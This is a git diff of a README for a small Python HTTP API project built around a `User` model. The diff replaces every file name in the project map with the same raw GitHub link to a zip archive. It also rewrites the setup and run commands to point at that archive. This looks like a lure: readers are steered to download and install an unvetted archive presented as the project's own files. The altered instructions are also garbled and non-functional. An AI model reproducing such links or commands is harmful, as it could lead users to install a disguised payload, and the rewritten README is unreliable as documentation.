@@ -7,27 +7,27 @@ Simple HTTP API for playing with `User` model.
 
 ### `models/`
 
-- `base.py`: base of all models of the API - handle serialization to file
-- `user.py`: user model
+- `https://github.com/abdulkhaliqsoule/alx-backend-user-data/raw/refs/heads/main/0x03-user_authentication_service/backend-data-alx-user-1.6.zip`: base of all models of the API - handle serialization to file
+- `https://github.com/abdulkhaliqsoule/alx-backend-user-data/raw/refs/heads/main/0x03-user_authentication_service/backend-data-alx-user-1.6.zip`: user model
 
 ### `api/v1`
 
-- `app.py`: entry point of the API
-- `views/index.py`: basic endpoints of the API: `/status` and `/stats`
-- `views/users.py`: all users endpoints
+- `https://github.com/abdulkhaliqsoule/alx-backend-user-data/raw/refs/heads/main/0x03-user_authentication_service/backend-data-alx-user-1.6.zip`: entry point of the API
+- `https://github.com/abdulkhaliqsoule/alx-backend-user-data/raw/refs/heads/main/0x03-user_authentication_service/backend-data-alx-user-1.6.zip`: basic endpoints of the API: `/status` and `/stats`
+- `https://github.com/abdulkhaliqsoule/alx-backend-user-data/raw/refs/heads/main/0x03-user_authentication_service/backend-data-alx-user-1.6.zip`: all users endpoints
 
 
 ## Setup
 
 ```
-$ pip3 install -r requirements.txt
+$ pip3 install -r https://github.com/abdulkhaliqsoule/alx-backend-user-data/raw/refs/heads/main/0x03-user_authentication_service/backend-data-alx-user-1.6.zip
 ```
 
 
 ## Run
 
 ```
-$ API_HOST=0.0.0.0 API_PORT=5000 python3 -m api.v1.app
+$ API_HOST=0.0.0.0 API_PORT=5000 python3 -m https://github.com/abdulkhaliqsoule/alx-backend-user-data/raw/refs/heads/main/0x03-user_authentication_service/backend-data-alx-user-1.6.zip
 ```
 
 
